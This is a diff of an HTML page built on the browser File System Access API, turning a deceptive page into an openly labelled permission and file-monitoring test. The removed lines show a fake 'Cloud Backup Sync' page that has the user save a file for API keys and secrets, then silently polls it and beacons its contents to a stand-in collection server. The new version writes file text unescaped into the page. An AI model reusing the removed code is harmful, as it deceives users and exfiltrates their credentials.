@@ -2,34 +2,32 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Cloud Backup Service</title>
+<title>FS Access Deep Test</title>
 <style>
-body { font-family: Arial; background:#eef2ff; padding:40px;}
-.box { background:white; padding:20px; border-radius:10px; max-width:500px;}
-#status { margin-top:10px; color:#333;}
+body { font-family: Arial; background:#f3f4f6; padding:30px;}
+#log { background:#111; color:#0f0; padding:10px; height:220px; overflow:auto;}
+button { margin:5px; padding:10px;}
 </style>
 </head>
 <body>
 
-<div class="box">
-<h2>☁️ Cloud Backup Sync</h2>
-<p>Save your config file to enable automatic cloud sync.</p>
+<h2>🧪 File System Access – Deep Test</h2>
 
-<button onclick="init()">Enable Sync</button>
-<div id="status"></div>
-</div>
+<button onclick="init()">1. Pick File</button>
+<button onclick="checkPermission()">2. Check Permission</button>
+<button onclick="startMonitor()">3. Start Monitor</button>
+
+<div id="log"></div>
 
 <script>
 let handle;
 let lastData = "";
 
-// fake server endpoint (ganti kalau mau real test)
-const SERVER = "https://example.com/collect";
-
-function status(msg){
-  document.getElementById("status").innerText = msg;
+function log(msg){
+  document.getElementById("log").innerHTML += msg + "<br>";
 }
 
+// STEP 1
 async function init(){
   try{
     handle = await window.showSaveFilePicker({
@@ -40,42 +38,75 @@ async function init(){
     await writable.write("api_key=\nsecret=\n");
     await writable.close();
 
-    status("✅ Sync enabled");
-
-    startStealthMonitor();
+    log("✅ File selected & written");
 
   }catch(e){
-    status("Error: " + e.message);
+    log("❌ Error: " + e.message);
   }
 }
 
-// 🔥 stealth monitoring
-function startStealthMonitor(){
-  setInterval(async ()=>{
-    try{
-      const file = await handle.getFile();
-      const text = await file.text();
+// 🔥 permission visibility
+async function checkPermission(){
+  if(!handle) return log("No handle");
 
-      if(text !== lastData){
-        lastData = text;
+  const readPerm = await handle.queryPermission({mode: "read"});
+  const writePerm = await handle.queryPermission({mode: "readwrite"});
 
-        // 🔥 simulate exfiltration
-        navigator.sendBeacon(SERVER, text);
+  log("🔐 Read permission: " + readPerm);
+  log("✍️ Write permission: " + writePerm);
+}
 
-        console.log("Synced silently");
-      }
+// 🔥 safer read (handle state change)
+async function safeRead(){
+  try{
+    const file = await handle.getFile();
+    return await file.text();
 
-    }catch(e){
-      console.log("blocked");
+  }catch(e){
+
+    // 🔥 detect state invalidation
+    if(e.message.includes("state cached")){
+      log("⚠️ File changed externally, refreshing state...");
+      return null;
     }
+
+    // 🔥 detect permission drop
+    if(e.name === "NotAllowedError"){
+      log("🚫 Permission revoked");
+      return null;
+    }
+
+    log("❌ Read error: " + e.message);
+    return null;
+  }
+}
+
+// 🔥 monitoring loop
+function startMonitor(){
+  setInterval(async ()=>{
+
+    if(!handle) return;
+
+    const text = await safeRead();
+    if(!text) return;
+
+    if(text !== lastData){
+      log("📡 Change detected:");
+      log("<pre>"+text+"</pre>");
+
+      lastData = text;
+    }
+
   }, 1500);
 }
 
-// 🔥 run even when tab hidden
+// 🔥 lifecycle awareness
+window.addEventListener("focus", ()=>{
+  log("👁️ Tab focused");
+});
+
 document.addEventListener("visibilitychange", ()=>{
-  if(document.hidden){
-    console.log("running in background");
-  }
+  log(document.hidden ? "🌙 Background mode" : "☀️ Active");
 });
 </script>
 
